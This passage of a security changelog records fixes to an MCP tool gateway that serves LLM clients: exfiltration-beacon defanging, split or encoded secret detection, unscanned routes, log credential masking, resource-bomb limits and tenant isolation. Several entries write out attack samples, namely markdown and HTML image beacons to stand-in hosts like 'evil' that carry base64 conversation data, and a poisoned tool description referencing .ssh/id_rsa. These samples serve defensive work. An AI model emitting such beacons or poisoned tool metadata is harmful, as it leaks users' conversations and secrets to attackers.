+  decisions were not audited**. `ext_mcp_proxy` audits its SSRF/credential/PII blocks (CHG-0068/0070) but
+  several fail-closed enforcement decisions recorded NOTHING → invisible in the MCPEvent trail:
+  response-too-large withhold (SSE + non-SSE, CHG-0064), non-JSON body withhold + redact, JSON-RPC
+  error-content withhold + redact, non-200 body withhold + redact (CHG-0061), request-body-too-large DoS
+  reject. This is the residual CHG-0068/0070 explicitly left open. **FIX:** added `_ext_audit(...)` at every
+  silent site (fire-and-forget, no latency, no-op unauth) with stable reasons (`response_too_large`,
+  `text_body_withheld`/`text_body_redacted`, `error_content_withheld`/`error_content_redacted`,
+  `nonok_body_withheld`/`nonok_body_redacted`, `request_too_large`), carrying tool + tags + findings. Purely
+  additive (response bodies unchanged). NEW TEST `test_mcp_ext_withhold_audit.py` (5, assert
+  `_record_gateway_event` fired with the right decision/reason; text test also asserts email masked on
+  egress). Gate: 5 + 1558 gateway passed, 0 failed; broker 108. touched: owning-session ext passthrough audit
+  (CHG-0068/0070). Evidence `mcp-parallel/findings/backstop-p-ext-withhold-audit/`. RESIDUAL: the
+  domain-not-allowlisted 403 (before the `_ext_audit` closure, static input reject) left unaudited by design.
+
+- **CHG-0096** (2026-07-03) — **HIGH zero-click exfil: MCP tool RESULTS not defanged for auto-render EXFIL
+  BEACONS**. The chat output guard defangs markdown-image `![x](https://evil/?d=<data>)` / bare beacon URLs
+  via `neutralize_exfil_channels`, but the MCP result scan (orchestrator `_scan_text_tier1`) only ran
+  `redact_all` — masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result
+  with `![x](https://evil/?d=<base64-of-conversation>)` (opaque payload the regexes miss) egressed as a live
+  auto-render beacon a markdown/LLM client AUTO-FETCHES on render → zero-click exfil; this egress BYPASSES the
+  chat output guard (separate API surface). **FIX:** (1) `_scan_text_tier1` runs `neutralize_exfil_channels`
+  on the RAW text (before `redact_all` so the payload is visible to `_url_smuggles_data`), adds an `exfil`
+  finding, sets the mutation to `redact_all(neutralized)` (if PII/secret present) or the neutralized text;
+  gated `enforcement != "monitor"`. (2) tier1 only APPLIES a mutation under `redact`, so added
+  `_findings_have_exfil` + OR'd into the E12 result-redaction FLOOR trigger at all 3 sites (CHG-0074 pattern)
+  so the defang fires under the default `tag` posture. NEW TEST `test_mcp_result_exfil_beacon_defang.py` (10).
+  Gate: 10 + 1568 gateway passed, 0 failed; broker 108. Byte-level: `![a](.../?leak=john.doe@corp.example)` →
+  `[a](https://attacker.io/[exfil-redacted])`; 5 benign unchanged. ORACLE NOTE: aidefence blind here (rated
+  the raw `?leak=<email>` beacon `hasPII=false`); byte-level + behavior test authoritative. touched:
+  owning-session MCP scan core (orchestrator + CHG-0074/E12 floor); reuses `output_guard`. Evidence
+  `mcp-parallel/findings/backstop-p-result-exfil-beacon/`. RESIDUAL: an HTML `<img>`/srcset beacon nested in a
+  JSON result field is NOT defanged (whole-payload JSON scan escapes the attribute quotes; HTML regexes miss
+  them) — markdown/bare-URL ARE defanged; per-field neutralization is a future item. → **CLOSED by CHG-0097.**
+
+- **CHG-0097** (2026-07-03) — **HIGH zero-click exfil, CLOSES the CHG-0096 residual**: HTML/SVG/CSS/srcset
+  exfil beacons NESTED in a JSON tool-result field. The MCP tier-1 target (`target_mode="entire"`) is the
+  whole payload JSON-serialized, so HTML attribute quotes are escaped (`src=\"…\"`) and
+  `neutralize_exfil_channels`'s HTML regexes (expecting real quotes) miss them — markdown (no quotes) survived
+  JSON-serialization and defanged, HTML did not. **FIX:** `_neutralize_exfil_deep(text)`
+  (`mcp_scan_orchestrator.py`) — if the target is JSON, parse it, neutralize each UNESCAPED string LEAF,
+  re-serialize (HTML/srcset/CSS/SVG defang correctly, valid JSON escaping preserved); non-JSON neutralized
+  directly; returns the original unchanged when nothing defanged (benign byte-identical). `_scan_text_tier1`
+  calls it instead of `neutralize_exfil_channels` (the CHG-0096 exfil finding + floor-trigger wiring is
+  unchanged). +8 tests (HTML img/srcset/CSS/SVG defanged; 3 benign HTML images untouched; `_neutralize_exfil_deep`
+  unit incl. malformed-JSON fallback). Gate: 18 + 1576 gateway passed, 0 failed; broker 108. Byte-level:
+  `<img src="https://evil/?d=<b64>">` → `<img src=\"[exfil-redacted]\">`; benign cdn image unchanged. touched:
+  owning-session orchestrator (completes CHG-0096). Evidence
+  `mcp-parallel/findings/backstop-p-result-exfil-html-nested/`. The MCP result path now defangs markdown /
+  bare-URL / protocol-relative / HTML-media / srcset / CSS-url / SVG-href zero-click beacons (chat-guard parity).
+
+- **CHG-0098** (2026-07-03) — **HIGH fail-open 1.4 leak: ext-proxy NON-FINITE SSE stream (server
+  notifications) egressed UNSCANNED**. `ext_mcp_proxy` buffers+scans SSE only for finite methods
+  (`_EXT_FINITE_RESULT_METHODS`); a non-finite stream (`notifications/*`, subscribe, long-lived) was forwarded
+  RAW (`stream_gen` yielded `aiter_bytes` verbatim, only a `LOG.warning("streaming_egress_unscanned")`) because
+  buffering an open stream could hang/OOM — but an untrusted upstream can push sensitive data in a
+  `notifications/message` `params`, so it was a real unbounded egress leak (the last unscanned MCP egress
+  channel). **FIX:** scan PER EVENT with bounded memory. `_scan_reframe_sse_tool_result` gained
+  `scan_notifications` (a notification frame — no result/error, has `params` — gets its whole message scanned
+  via the floor, reusing CHG-0093 reassembly). The non-finite branch buffers only up to ONE event (cap
+  `_MCP_SSE_EVENT_MAX_BYTES`=1 MB, env), scans + re-emits; an over-cap unterminated event is WITHHELD
+  fail-closed; a blocked event is withheld via an SSE comment and the stream continues. Audited
+  (`sse_stream_scanned` / `sse_stream_event_withheld` / `_too_large`). NEW TEST
+  `test_mcp_ext_sse_stream_scan.py` (5); updated `test_mcp_bare_proxy_scan.py`'s obsolete passthrough test
+  (another session's) to assert the scanned behavior. Gate: 5 + 1581 gateway passed, 0 failed; broker 108.
+  Byte-level: notification secret+PII+IP → `AKIA****MPLE` / `b***@c***.example`; benign progress unchanged.
+  Independent oracle (aidefence): `has_pii` false masked / true raw. touched: owning-session ext passthrough
+  (CHG-0039/0061/0064/0070/0095) + CHG-0093. Evidence `mcp-parallel/findings/backstop-p-ext-sse-stream-scan/`.
+  Cross-EVENT splits don't reassemble client-side, so per-event scanning suffices.
+
+- **CHG-0099** (2026-07-03) — **HIGH fail-open 1.4 leak: markdown-split / encoded PII-secret in MCP tool
+  results evaded the scanner**. The chat output guard applies THREE render-leak neutralizers
+  (`neutralize_exfil_channels` → `neutralize_encoded_pii` → `neutralize_markdown_split_pii` G44); CHG-0096
+  wired only the FIRST into the MCP result path. So a PII/secret whose chars are interleaved with inline
+  markdown emphasis/code/HTML (`1**2**3-45-6789`, `AKIA**IOSFODNN7**EXAMPLE`, `4111**-1111-1111-**1111`,
+  `1&#50;3-45-6789`) evaded the raw regexes (`tags=[]`) yet a markdown client STRIPS the emphasis on render
+  and reconstructs the value → real leak. **FIX:** `_neutralize_render_leaks(text)` composes all three (same
+  order as `sanitize_output_for_verdict`); `_neutralize_exfil_deep` (the CHG-0097 JSON-leaf walker) calls it
+  per leaf, so exfil beacons AND markdown-split/encoded PII nested in a JSON field are neutralized. Masked run
+  → `[PII_REDACTED]`; the finding drives the E12 floor under the default `tag` posture. Strict no-op on benign
+  markdown (`**bold**`, `2*3`, `` `code` ``, `a_b_c`). +9 tests (5 md/encoded-split masked + rendered-safe +
+  exfil finding; 4 benign untouched; all exfil-beacon tests pass). Gate: 27 + 1594 gateway passed, 0 failed;
+  broker 108. Byte-level: `The SSN is 1**2**3-45-6789 exactly` → `The SSN is [PII_REDACTED] exactly`.
+  Independent oracle (aidefence on the RENDERED view): `has_pii` true rendered-raw / false rendered-fixed.
+  touched: owning-session orchestrator (extends CHG-0096/0097); reuses chat guard neutralizers. Evidence
+  `mcp-parallel/findings/backstop-p-result-markdown-split-pii/`. The MCP result egress now has FULL chat-guard
+  render-leak parity. RESIDUAL: secret SPLIT ACROSS content-array items (client-concat-dependent) — future item.
+  → **CLOSED by CHG-0100.**
+
+- **CHG-0100** (2026-07-03) — **MEDIUM–HIGH fail-open 1.4 leak (client-concat-dependent): secret SPLIT ACROSS
+  content-array items evaded the tool-result scan**. A malicious upstream splits a secret so each half is a
+  benign sub-pattern in adjacent content blocks (`…AKIAIOSFOD` / `NN7EXAMPLE…`); the whole-payload scan sees
+  the halves separated by JSON structure so the value is never contiguous (`tags=[]`), yet a client that
+  CONCATENATES the text blocks reconstructs it. **FIX (`mcp_proxy.py`):** `_scan_tool_result_floor` runs a
+  cross-block check (unless per-tool `monitor` wins) — `_result_has_split_secret` concatenates all
+  content-block text + scans for HIGH-CONFIDENCE secrets/credentials (`detect_secrets` +
+  `detect_credential_exposure` + SECRET-tagged `detect_pii`); a kind in the concatenation but NOT wholly
+  inside any single block was reconstructed only by the join → fail CLOSED (block). Scoped to
+  secrets/credentials (not generic PII) → negligible FP; a contiguous secret in one block is left to the
+  normal redaction floor (no over-block). +8 tests (split-2/3 blocked; contiguous redacted-not-blocked; benign
+  multi-block passes; single block; monitor observe-only; 2 helper units). Gate: 8 + 1602 gateway passed, 0
+  failed; broker 108. BLOCK decision (aidefence-as-oracle N/A, also blind to AWS-key-class); behavior test
+  authoritative. touched: owning-session MCP scan core (completes CHG-0093/0099). Evidence
+  `mcp-parallel/findings/backstop-p-result-cross-block-split/`. Completes the split-evasion family (SSE
+  multi-line CHG-0093, markdown-split CHG-0099, content-array-split CHG-0100).
+
+- **CHG-0101** (2026-07-03) — **item-20 concurrency dimension** (verification + regression-lock, ZERO
+  defects): CHG-0090 proved the plaintext-redaction chain concurrency-safe but predates the render-leak
+  neutralization (CHG-0096/0097/0099 — exfil beacons + markdown-split/encoded PII) and the cross-block
+  split-block (CHG-0100), which run in the HOT scan path (neutralizers via module-level compiled regexes +
+  JSON walk; split check via pure detection over a per-result block concatenation). NEW TESTS
+  (`test_mcp_scan_concurrency_safety.py`, +2): fire 300 concurrent `_scan_tool_result_floor` calls across 10
+  orgs — (1) each with a UNIQUE benign token + UNIQUE base64 exfil beacon + a markdown-split secret → asserts
+  the token SURVIVES, the beacon is DEFANGED, the markdown-split does NOT reconstruct, and 0 cross-contamination;
+  (2) each with a valid AWS key split across two content blocks → asserts ALL 300 BLOCKED (`cross_block_split_secret`
+  meta). RESULT: **0 lost / 0 surviving beacons / 0 reconstructed / 0 cross-contamination; 300/300 blocked** →
+  the CHG-0096–0100 guardrails are stateless/isolation-safe under concurrency. Gate: 4 (2 CHG-0090 + 2
+  CHG-0101) + 1604 gateway passed, 0 failed; broker 108. Evidence
+  `mcp-parallel/findings/backstop-p20-render-leak-concurrency/`. **HONESTY NOTE:** proves concurrency-SAFETY,
+  NOT the full 300–500-sandbox live stress (items 14–20, host-blocked).
+
+- **CHG-0102** (2026-07-03) — **MEDIUM DoS-amplification SELF-CORRECTION (item 16 resource-bombs)**: a
+  resource-bomb probe of the scan path found it fails CLOSED on a JSON bomb (deeply-nested → `SCAN_ERROR`
+  block) but my CHG-0100 split-check added ~3 s (33 %) to a 5 MB multi-block result — it concatenated ALL
+  content-block text (`"".join`) and ran 3 detect passes over the full O(total_text) concat. Under 5k–10k
+  concurrent that's a real DoS vector I introduced. **FIX (`mcp_proxy.py`):** a secret token is short, so a
+  cross-block split only spans a boundary within `_MCP_SPLIT_SECRET_SPAN` (default 512, env). `_boundary_concat`
+  trims each block to its boundary regions (block ≤ 2×span kept whole; a longer block keeps first-span +
+  `\n\x00\n` sentinel + last-span, dropping the interior which the full-text scan already covers for CONTIGUOUS
+  secrets); `_result_has_split_secret` scans that → O(num_blocks × span). +1 test. **Perf:** 5 MB multi-block
+  split-check 3.03 s → 0.378 s (~8×). **Correctness unchanged:** 2-way / 3-way / huge-left-boundary splits
+  caught; contiguous-in-interior not falsely flagged; benign passes. Gate: 9 + 1605 gateway passed, 0 failed;
+  broker 108. touched: self-correction of CHG-0100. Evidence
+  `mcp-parallel/findings/backstop-p16-split-check-dos-bound/`. RESIDUAL: a >512-char secret split into a long
+  block's trimmed interior could be missed (extreme; span env-tunable; full-text scan catches contiguous). The
+  pre-existing ~10 s detect on a 9 MB single block is a separate product-level trade-off, unchanged.
+
+- **CHG-0103** (2026-07-03) — **HIGH availability/DoS: the MCP Tier-1 scan BLOCKED the event loop under
+  load**. `_scan_text_tier1` (`mcp_scan_orchestrator.py`) was `async def` but its body is PURE SYNC CPU
+  (detect_pii/secrets/ip/cred — each a loop of `re.search` — + redact_all + encoded-exfil loop + render-leak
+  neutralizers), NO `await` → ran INLINE on the loop. A large tool result (up to 10 MB) is seconds of CPU
+  (detect_pii ~2.6 s on 8 MB; whole Tier-1 ~5–10 s) → it BLOCKS the loop, freezing EVERY concurrent request on
+  the worker. Measured: an 8 MB scan stalled a trivial `sleep(0.05)` coroutine **9.67 s**; an untrusted
+  upstream triggers it with one crafted result. **FIX:** split into a pure-CPU sync `_scan_text_tier1_sync`
+  (unchanged body) + an async wrapper `_scan_text_tier1` (same signature) that offloads to a worker thread via
+  `asyncio.to_thread` when text > `_TIER1_OFFLOAD_THRESHOLD` (64 KB, env `MCP_TIER1_OFFLOAD_BYTES`); small
+  inputs run inline. The `re` loop releases the GIL between patterns → the loop stays responsive. After: the
+  8 MB scan stalls the coroutine only **~0.2 s**; the secret is still masked (correctness through the thread).
+  +4 deterministic tests (patch `to_thread` — no flaky timing). Gate: 4 + 1609 gateway passed, 0 failed;
+  broker 108. All prior Tier-1 tests still pass. Pre-existing gap (chat scanner already offloads via
+  `run_in_executor`; MCP Tier-1 did not). Evidence
+  `mcp-parallel/findings/backstop-p16-tier1-event-loop-block/`. RESIDUAL: total CPU cost of a 9 MB scan (~10 s)
+  unchanged — it just no longer blocks the loop; capping is a separate product-level trade-off.
+
+- **CHG-0104** (2026-07-03) — **MEDIUM resource-bomb (item 16): content-block-count limit missing**. The 10 MB
+  response byte cap does NOT stop a many-tiny-block bomb — ~50k blocks × ~200 B is ~3–10 MB (UNDER the byte
+  cap) — which reaches the scan and amplifies cost across every per-block loop (JSON serialize, scan-target
+  extraction, tool filtering), stalling the event loop ~0.8 s (the residual after CHG-0103; NOT the detect
+  scan (offloaded) nor the split-check (a warm A/B showed offloading it made no difference), but the inline
+  many-object JSON/loop overhead). **FIX (`mcp_proxy.py`):** `_scan_tool_result_floor` fails CLOSED when a
+  result has more than `_MCP_MAX_CONTENT_BLOCKS` (default 10000, env `MCP_MAX_CONTENT_BLOCKS`) content blocks —
+  an O(1) `len()` check BEFORE the expensive scan, so a bomb costs nothing and never reaches the per-block
+  loops. `monitor` observe-only; handles `{"content":[…]}` + bare list. +7 tests. Behavior: a 50k-block bomb →
+  blocked in dt=0.000 s, MAX loop gap 0.000 s (was ~0.8 s). Gate: 7 + 1620 gateway passed, 0 failed; broker
+  108. touched: owning-session MCP scan core (complements CHG-0103). Evidence
+  `mcp-parallel/findings/backstop-p16-content-block-count-cap/`. HONESTY: first tried offloading the split-check
+  to a thread (like CHG-0103) but a warm A/B showed no benefit (0.80 s inline vs 0.84 s offloaded) → REVERTED
+  and landed on the block-count cap, which addresses the actual cost at O(1). No content leak → no aidefence oracle.
+
+- **CHG-0105** (2026-07-03) — **HIGH fail-open 1.4 leak: internal (chat→MCP) route returned stdio/websocket
+  tool RESULTS UNSCANNED**. `internal_tools_call` (the `X-Gateway-Internal-Key` route the CHAT pipeline uses
+  to run an MCP tool for a user) scans the RESULT only on the streamable-http path (`_scan_internal_result`);
+  on the SANDBOX transports (`stdio`/`websocket`) it returned the raw `_adapter_forward(...)` response
+  DIRECTLY → a secret / PII / IP / exfil-beacon / markdown-split value in a stdio/ws tool result egressed to
+  the chat pipeline → LLM context UNREDACTED, while the same tool via `org_mcp_jsonrpc` IS scanned. Confirmed:
+  a stdio result with `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` + `![x](https://evil…)` egressed all three
+  raw. **FIX (`mcp_proxy.py`):** the sandbox branch buffers the adapter response and (error-envelope aware,
+  CHG-0091) scans the whole `result` OR a bare `error` envelope via `_scan_tool_result_floor` (all hardened
+  machinery: redaction + render-leak neutralization CHG-0096-0100 + split-check + block-count cap); swaps in
+  the masked result, fails CLOSED (block error) on an unmaskable survivor, audits block/redact
+  (`transport="internal_sandbox"`) — full parity with the org path. NEW TEST
+  `test_mcp_internal_sandbox_result_scan.py` (5: secret+PII masked + redact audited; beacon defanged;
+  error-envelope secret masked; unmaskable → block; benign unchanged). Gate: 5 + 1625 gateway passed, 0
+  failed; broker 108. Byte-level: `alice.jones@corp.example` / `123-45-6789` → `a***@c***.example` /
+  `***-**-6789`. Independent oracle (aidefence): `has_pii` false fixed / true raw. touched: owning-session
+  `internal_tools_call`. Evidence `mcp-parallel/findings/backstop-p-internal-sandbox-result-unscanned/`.
+  RESIDUAL: the internal streamable-http `_scan_internal_result` scans only `result.content` (not a bare error
+  frame / `structuredContent`) — narrower than the sandbox complete-skip; follow-up → **CHG-0106**.
+
+- **CHG-0106** (2026-07-03) — **MEDIUM fail-open 1.4 leak (legacy fallback): internal direct-httpx path scanned
+  only `result.content`**. Closes the CHG-0105 residual. `_scan_internal_result` — the outbound result scanner on
+  `internal_tools_call`'s LEGACY direct-httpx path (reached only when `MCP_HTTP_VIA_SANDBOX=0`; the DEFAULT routes
+  ALL transports through the per-org sandbox = CHG-0105) — scanned only `result_obj.get("content")`. If
+  `result.content` was `None` it returned the reply **UNSCANNED** → a secret / PII / internal-IP in an upstream
+  JSON-RPC **error frame** (`error.message`) or a **`structuredContent`-only** result egressed **RAW** to the chat
+  pipeline → LLM. Byte-verified pre-fix (legacy path): error frame `AKIAIOSFODNN7EXAMPLE` + `10.1.2.3` +
+  `bob.jones@corp.example` egressed all three raw; `structuredContent`-only AWS key + SSN egressed both. It also
+  **silently swapped** masked content with **no audit**. **FIX (`mcp_proxy.py`):** error-envelope aware WHOLE-result
+  scan (mirrors sandbox CHG-0105 + org CHG-0091) — scans `resp["result"]` when present (`content` **and**
+  `structuredContent` **and** bare string/list) else the bare error envelope via `_scan_tool_result_floor`;
+  masks/blocks + **AUDITS the redact** (`decision="redact"`, `transport="internal"`), closing the audit omission.
+  NEW TEST `test_mcp_internal_http_result_scan.py` (5: error-frame secret+IP+PII masked; structuredContent-only
+  masked + redact audited; content control masked; redact audited; benign preserved). Gate: 5 + 1649 gateway
+  passed, 0 failed; broker 108. Byte-level (`MCP_HTTP_VIA_SANDBOX=0`): error frame → `key=AKIA****MPLE host
+  [INTERNAL_IPV4_REDACTED] user b***@c***.example`; structuredContent → `"secret":"***","ssn":"***-**-6789"`.
+  Independent oracle (aidefence): `has_pii` true raw / false fixed. touched: owning-session `internal_tools_call`
+  (`_scan_internal_result`); completes CHG-0105 follow-up. Evidence `mcp-parallel/findings/backstop-p-internal-
+  http-result-scan/`. Result-egress redaction now at full parity across org / sandbox / legacy-httpx.
+
+- **CHG-0107** (2026-07-03) — **MEDIUM 1.4 credential leak to OPERATOR LOGS (both consumers): URL-embedded creds
+  in stdio spawn args logged plaintext**. Closes the CHG-0053 follow-up. The stdio-spawn log line
+  (`Starting stdio MCP process: <cmd> <args> …`) had two defects: (a) CHG-0053's `_safe_args_for_log` masked
+  secret-FLAG values (`--token X` / `--api-key=X`) but ONLY on the sandbox agent; a credential in a URL passed as
+  a STANDALONE arg (`postgres://u:pw@h/db` · `https://x-access-token:ghp_…@github` · `https://h/mcp?api_key=…&token=…`)
+  still egressed RAW; (b) the GATEWAY adapter (`mcp_stdio_adapter.py:426`) logged args with NO masking at ALL.
+  Byte-verified pre-fix: all four URL-cred forms + `--token XYZ` egressed verbatim (gateway); the four URL forms
+  egressed (sandbox). **FIX:** ONE hardened `_safe_args_for_log` + `_redact_url_creds` now live in the SHARED
+  `shared/ai_mesh_shared/mcp_stdio_common.py` (imported by BOTH the gateway adapter and the vendored sandbox agent —
+  Dockerfile COPYs the shared file). Masks secret-flag values AND the WHOLE URL userinfo (`scheme://***@host` —
+  token can sit in user OR password position) + secret-named query-param values (`?api_key=***&token=***&page=2`,
+  non-secret preserved), for standalone args AND non-secret `--flag=URL` inline values; fail-safe (never raises on
+  a malformed URL). The sandbox agent's local CHG-0053 copy was DEDUPED into shared. TESTS: shared +12
+  (`test_stdio_common.py`), sandbox agent +2, gateway +1. Gate: 12 shared + 120 broker + 33 sandbox-agent + 1663
+  gateway passed, 0 failed. Byte-level: `postgres://admin:S3cr3tPass@db.internal:5432/prod` → `postgres://***@db.internal:5432/prod`;
+  `?api_key=AKIA…&token=abc&page=2` → `?api_key=***&token=***&page=2`; benign URL/pkgspec/flag controls correct.
+  Independent oracle (aidefence_scan): `piiFound` true on the raw postgres spawn-log line / false on the masked
+  line (aidefence is blind to the AWS-key/URL-query class → byte-level authoritative there; masking uses `urlsplit`
+  string ops, independent of the detection regexes). touched: shared stdio-common + gateway adapter (backstop add)
+  + sandbox agent (dedup CHG-0053 copy). Evidence `mcp-parallel/findings/backstop-p13-stdio-arg-url-cred-log-leak/`.
+  One log-hygiene helper, both deployables.
+
+- **CHG-0108** (2026-07-03) — **MEDIUM-HIGH 1.4 leak + tool-poisoning: internal tool-DISCOVERY route returned
+  upstream tools/list metadata UNSCANNED**. `internal_discover_tools` (the `X-Gateway-Internal-Key` route the
+  backend uses to SYNC an MCP server's tool catalog) returned the upstream `tools/list` **RAW** on BOTH paths
+  (sandbox `_adapter_forward`; direct-httpx `json.loads(data_str)` / `tools_resp.json()`). Tool descriptions /
+  names / inputSchema come LIVE from an UNTRUSTED upstream MCP server, synced into the catalog + shown to the
+  model → a secret / PII / internal-IP (or a CHG-0076 encoded-exfil payload) in a description egressed to the
+  backend/LLM unredacted, while `org_mcp_jsonrpc` tools/list (CHG-0077/0092), the REST list (CHG-0079), AND the
+  ext-proxy all scan tool metadata. Byte-verified pre-fix: a description carrying `AKIAIOSFODNN7EXAMPLE` +
+  `bob.jones@corp.example` + `10.9.8.7` egressed all three raw on both paths. **FIX (`mcp_proxy.py`):** new
+  `_scan_internal_tools_list` scans the discovered payload — tools-shaped → `_scanned_tools_list_response` (mask a
+  maskable metadata leak; fail-closed BLOCK poisoned/unmaskable metadata; audit); a bare error envelope →
+  `_scan_tool_result_floor` (CHG-0092 parity) + audit; wired into all 3 return points (sandbox buffer+scan; direct
+  SSE; direct JSON); fetches `enabled_info` (respects a `monitor` override); `actor=None` (descriptions not
+  actor-scoped). NEW TEST `test_mcp_internal_discover_tools_scan.py` (5: direct desc secret+PII+IP masked + redact
+  audited; sandbox desc masked + audited; poisoned/unmaskable → withheld+block; error-envelope secret masked;
+  benign preserved). Gate: 5 + 1668 gateway passed, 0 failed; broker 120 (unaffected). Byte-level: `Contact
+  bob.jones@corp.example key AKIAIOSFODNN7EXAMPLE host 10.9.8.7` → `Contact b***@c***.example key AKIA****MPLE host
+  [INTERNAL_IPV4_REDACTED]`; poisoned `…/.ssh/id_rsa` desc → `tools/list withheld`. Independent oracle (aidefence):
+  `has_pii` true raw / false masked. touched: owning-session `internal_discover_tools`; extends CHG-0077/0079/0092.
+  Evidence `mcp-parallel/findings/backstop-p-internal-discover-tools-unscanned/`. tools/list scanning now at full
+  parity across org-jsonrpc / REST / ext-proxy / internal-discovery.
+
+- **CHG-0109** (2026-07-03) — **LOW-MED audit-completeness (tag-inputs→audit): INBOUND arg redaction was not
+  audited on the internal / bare-REST / ext paths**. When tool ARGUMENTS carry PII/IP the gateway MASKS
+  (`scan_action="redact"`, not a hard block) before forwarding, the main `org_mcp_jsonrpc` path folds it into its
+  per-call `_was_redacted` event — but `internal_tools_call` / `org_mcp_tool_call` / `ext_mcp_proxy` swapped the
+  masked args in SILENTLY (`if scanned_args is not arguments: arguments = scanned_args`, no `_record_gateway_event`)
+  → the INPUT redaction was INVISIBLE to the audit/SIEM trail, asymmetric with the block branch
+  (`pii_blocked_inbound`) + the result-side redact audits (CHG-0081 REST / CHG-0106 internal). Byte-proven
+  reachable: a `default_scan_action="redact"` server masked `bob.jones@corp.example` → `b***@c***.example` in the
+  forwarded args, and ZERO gateway events were recorded. **FIX (`mcp_proxy.py`):** the 3 paths now record
+  `decision="redact", reason="pii_redacted_inbound"` (inbound tags + findings + meta) on inbound redaction (not
+  blocked) — parity with the block branch + the main-path per-call event. Benign args → nothing (no noise);
+  credential → still force-BLOCK (never a redact). The ext edit is defense-in-depth parity (ext scans args with
+  `enabled_info=None` → `"tag"` → no inbound redaction under current config). NEW TEST
+  `test_mcp_inbound_redact_audit.py` (5). Gate: 5 + 1673 gateway passed, 0 failed; broker 120 (unaffected). NOT a
+  leak — the egress was already redacted; this is an audit-VISIBILITY fix (oracle: forwarded masked args
+  `has_pii=false`). touched: owning-session proxy's 3 non-main inbound paths; inbound twin of CHG-0081/0106.
+  Evidence `mcp-parallel/findings/backstop-p-inbound-redact-audit/`. Inbound-redact audit now at parity across all
+  4 tool-call paths.
+
+- **CHG-0110** (2026-07-03) — **LOW-MED least-privilege / context-minimization: ext-proxy egress leaked client IP /
+  internal topology / org slug to third-party servers**. `_ext_proxy_forward_headers` (the transparent EXTERNAL
+  proxy outbound header set) is a DENYLIST — it stripped credentials (`authorization`/`cookie`/`x-api-key`,
+  CHG-0033) + `x-gateway-*` + hop-by-hop, but forwarded EVERYTHING else to the untrusted third-party server. So
+  request-ROUTING / client-IDENTITY headers leaked: `x-forwarded-for`/`x-real-ip` (caller's real public IP + an
+  internal IP), `x-forwarded-host`/`forwarded`/`via` (internal gateway host + proxy chain), and `referer` (internal
+  URL **+ the ORG/TENANT slug**, e.g. `https://gw.internal/org/demo/chat`). Byte-verified pre-fix: `203.0.113.9` +
+  `10.0.0.2` + `gw.internal` + `org/demo` all egressed. **FIX (`mcp_proxy.py`):** also drop `_EXT_ROUTING_HEADERS`
+  (`x-real-ip`, `forwarded`, `via`, `referer`, `referrer`) + any `x-forwarded-*` (prefix). A third-party server now
+  sees only protocol/benign headers (`content-type`, `accept`, `mcp-session-id`, `mcp-protocol-version`,
+  `user-agent`) + the gateway's OWN injected upstream OAuth — NEITHER the caller's IP, NOR the internal topology,
+  NOR the tenant slug. Credential-stripping (CHG-0033) unchanged. NEW TEST (+1 in `test_mcp_bare_proxy_scan.py`).
+  Gate: 3 `forward_headers` + 1682 gateway passed, 0 failed; broker 120 (unaffected). NOT a credential leak (creds
+  already stripped) → privacy / topology / tenant-identity minimization; aidefence is blind to the IP/header class
+  (`piiFound=false` on the raw blob) → byte-level header-absence assertion is authoritative. touched: owning-session
+  `_ext_proxy_forward_headers` (extends CHG-0033). Evidence `mcp-parallel/findings/backstop-p-ext-egress-header-minimization/`.
+
+- **CHG-0111** (2026-07-03) — **HIGH cross-tenant isolation break: broker org_slug sanitize-collision**. The broker
+  key (`X-MCP-Broker-Key`) is a SHARED secret (not per-org), so the path `org_slug` is the SOLE tenant selector for
+  sandbox routing. `DockerManager` LOSSILY sanitizes it for the container/volume/network name
+  (`re.sub(r"[^a-zA-Z0-9_.-]","-",slug).strip("-") or "default"`) and `find_container` matches by that NAME first
+  (`get_container_by_name`) before the exact-label filter. NO route validated the slug. So DISTINCT slugs COLLIDE
+  onto ONE container: `acme/prod` == `acme-prod`; `acme prod` == `acme-prod`; `-acme` == `acme-` == `acme`; `teñant`
+  == `te-ant`; empty/all-invalid (`""`/`///`/`!!!`) -> `default`. A colliding slug on `/rpc` runs org B's tool call
+  in org A's sandbox; `DELETE /{org_slug}` destroys the wrong org's container; `/status` leaks another org's process
+  list. **FIX (`services/mcp-broker/src/sandbox/routes.py`):** new `_require_canonical_org_slug` fails CLOSED (400)
+  on any slug the sanitizer would alter — accept ONLY `sanitize(slug)==slug` (non-empty, <=64, no leading/trailing
+  `-`, chars in `[a-zA-Z0-9_.-]`); applied to `/ensure` `/rpc` `/stdio/rpc` `/status` `DELETE /{org_slug}`. (Encoded-
+  slash slugs also 404 at FastAPI routing before the handler.) Canonical slugs unaffected. NEW TEST
+  `test_sandbox_org_slug_validation.py` (26). Gate: 26 + 146 broker passed; gateway unaffected (posts to the broker
+  over HTTP, supplies validated org slugs). Oracle N/A — cross-tenant ROUTING/isolation fix, no PII-text egress
+  delta (collision demo + route-level 400s authoritative). touched: broker sandbox routes (`build_sandbox_router`);
+  complements CHG-0052. Evidence `mcp-parallel/findings/backstop-p-broker-org-slug-collision/`.
+
+- **CHG-0112** (2026-07-03) — **MEDIUM-HIGH cross-tenant residual (completes CHG-0111): broker by-name container
+  lookup didn't verify the org label**. `find_container(slug)` calls `get_container_by_name` FIRST, which did a
+  pure `client.containers.get(container_name(slug))` with NO label check. The container NAME comes from a LOSSY
+  sanitizer, so a name match is NOT proof of tenancy: a legacy/renamed/reused container that owns the name but
+  carries a DIFFERENT `LABEL_ORG_SLUG` would be returned for the WRONG org — e.g. a pre-CHG-0111 container created
+  for the colliding slug `acme/prod` still owning `…-acme-prod`, matched for the canonical `acme-prod`. CHG-0111's
+  input validation can't cover this (the mislabeled container already exists). **FIX
+  (`services/mcp-broker/src/sandbox/docker_manager.py`):** `get_container_by_name` now reads the labels (new
+  `_container_labels` helper, robust to SDK `.labels` vs `attrs.Config.Labels`) and returns the container ONLY if
+  `LABEL_ORG_SLUG==slug` AND `LABEL_ROLE=="mcp-sandbox"`; on mismatch it logs + returns None (fail-closed), so
+  `find_container` falls through to the authoritative label-filtered `containers.list`. The org LABEL is now the
+  tenant key; the deterministic name is only an optimization. +4 tests; the two broker `_mock_container` helpers
+  made realistic (real sandbox containers always carry these labels, set by `ensure`). Gate: 4 + 150 broker passed;
+  gateway unaffected (broker-only). Oracle N/A — cross-tenant ROUTING/isolation fix, no PII-text egress delta.
+  touched: broker `DockerManager` resolution; completes CHG-0111 (input-validation + label-verification =
+  belt-and-suspenders). Evidence `mcp-parallel/findings/backstop-p-broker-name-label-verify/`.
+
